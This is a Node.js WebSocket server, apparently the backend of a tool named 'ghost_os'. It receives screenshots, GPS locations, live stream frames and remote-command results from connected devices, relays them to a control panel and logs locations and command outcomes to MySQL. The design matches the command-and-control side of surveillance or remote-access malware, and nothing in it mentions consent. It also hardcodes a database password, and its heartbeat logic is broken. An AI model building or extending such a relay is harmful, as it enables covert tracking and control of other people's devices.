/**
 * Serveur WebSocket pour réception temps réel
 */

const WebSocket = require('ws');
const mysql = require('mysql2');
const url = require('url');

// Configuration
const PORT = 8080;
const DB_CONFIG = {
    host: 'localhost',
    user: 'ghost_user',
    password: 'VotreMotDePasseIci123!',
    database: 'ghost_os'
};

// Connexion MySQL
const pool = mysql.createPool(DB_CONFIG).promise();

// Clients connectés
const clients = new Map(); // userId -> { devices: Map, panels: Set }

// Serveur WebSocket
const wss = new WebSocket.Server({ port: PORT });

console.log(`[WebSocket] Serveur démarré sur le port ${PORT}`);

wss.on('connection', async (ws, req) => {
    const params = new URLSearchParams(url.parse(req.url).query);
    const apiKey = params.get('api_key');
    const deviceId = params.get('device_id');
    const isPanel = params.get('panel') === 'true';
    
    // Authentification
    const [users] = await pool.query(
        'SELECT id FROM users WHERE api_key = ?',
        [apiKey]
    );
    
    if (users.length === 0) {
        ws.close(1008, 'Invalid API key');
        return;
    }
    
    const userId = users[0].id;
    
    console.log(`[WebSocket] Connecté: User ${userId}, Device ${deviceId || 'panel'}`);
    
    // Enregistrer le client
    if (!clients.has(userId)) {
        clients.set(userId, { devices: new Map(), panels: new Set() });
    }
    
    const userClients = clients.get(userId);
    
    if (isPanel) {
        // Client panel
        userClients.panels.add(ws);
        
        // Envoyer la liste des appareils en ligne
        const onlineDevices = Array.from(userClients.devices.keys());
        ws.send(JSON.stringify({
            type: 'devices_online',
            devices: onlineDevices
        }));
        
    } else {
        // Appareil
        userClients.devices.set(deviceId, ws);
        
        // Mettre à jour le statut dans la base
        await pool.query(
            'UPDATE devices SET is_online = 1, last_seen = NOW() WHERE device_id = ? AND user_id = ?',
            [deviceId, userId]
        );
        
        // Notifier les panels
        userClients.panels.forEach(panel => {
            if (panel.readyState === WebSocket.OPEN) {
                panel.send(JSON.stringify({
                    type: 'device_online',
                    deviceId: deviceId,
                    timestamp: Date.now()
                }));
            }
        });
    }
    
    // ============================================
    // Gestion des messages
    // ============================================
    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            
            switch (message.type) {
                
                case 'screenshot':
                    // Diffusion en temps réel
                    userClients.panels.forEach(panel => {
                        if (panel.readyState === WebSocket.OPEN) {
                            panel.send(JSON.stringify({
                                type: 'screenshot',
                                deviceId: message.deviceId,
                                image: message.image,
                                timestamp: message.timestamp
                            }));
                        }
                    });
                    
                    // Sauvegarde en base
                    // Note: Les fichiers lourds passent par upload.php
                    break;
                    
                case 'location':
                    // Diffusion aux panels
                    userClients.panels.forEach(panel => {
                        if (panel.readyState === WebSocket.OPEN) {
                            panel.send(JSON.stringify({
                                type: 'location',
                                deviceId: message.deviceId,
                                lat: message.lat,
                                lng: message.lng,
                                timestamp: message.timestamp
                            }));
                        }
                    });
                    
                    // Sauvegarde en base
                    await pool.query(
                        `INSERT INTO locations (device_id, latitude, longitude, timestamp)
                         VALUES ((SELECT id FROM devices WHERE device_id = ?), ?, ?, NOW())`,
                        [message.deviceId, message.lat, message.lng]
                    );
                    break;
                    
                case 'stream':
                    // Streaming en direct
                    userClients.panels.forEach(panel => {
                        if (panel.readyState === WebSocket.OPEN) {
                            panel.send(JSON.stringify({
                                type: 'stream',
                                deviceId: message.deviceId,
                                frame: message.frame,
                                timestamp: message.timestamp
                            }));
                        }
                    });
                    break;
                    
                case 'command_result':
                    // Résultat de commande
                    userClients.panels.forEach(panel => {
                        if (panel.readyState === WebSocket.OPEN) {
                            panel.send(JSON.stringify({
                                type: 'command_result',
                                deviceId: message.deviceId,
                                commandId: message.commandId,
                                result: message.result,
                                error: message.error
                            }));
                        }
                    });
                    
                    // Mettre à jour en base
                    if (message.commandId) {
                        await pool.query(
                            `UPDATE commands 
                             SET status = ?, result = ?, executed_at = NOW()
                             WHERE id = ?`,
                            [message.error ? 'failed' : 'executed', 
                             JSON.stringify(message.result), 
                             message.commandId]
                        );
                    }
                    break;
                    
                case 'ping':
                    ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
                    break;
            }
            
        } catch (err) {
            console.error('[WebSocket] Erreur message:', err);
        }
    });
    
    // ============================================
    // Déconnexion
    // ============================================
    ws.on('close', async () => {
        console.log(`[WebSocket] Déconnecté: User ${userId}, Device ${deviceId || 'panel'}`);
        
        if (isPanel) {
            userClients.panels.delete(ws);
        } else {
            userClients.devices.delete(deviceId);
            
            await pool.query(
                'UPDATE devices SET is_online = 0 WHERE device_id = ? AND user_id = ?',
                [deviceId, userId]
            );
            
            userClients.panels.forEach(panel => {
                if (panel.readyState === WebSocket.OPEN) {
                    panel.send(JSON.stringify({
                        type: 'device_offline',
                        deviceId: deviceId,
                        timestamp: Date.now()
                    }));
                }
            });
        }
        
        // Nettoyer
        if (userClients.devices.size === 0 && userClients.panels.size === 0) {
            clients.delete(userId);
        }
    });
});

// Heartbeat
setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            ws.terminate();
            return;
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

console.log('[WebSocket] En attente de connexions...');
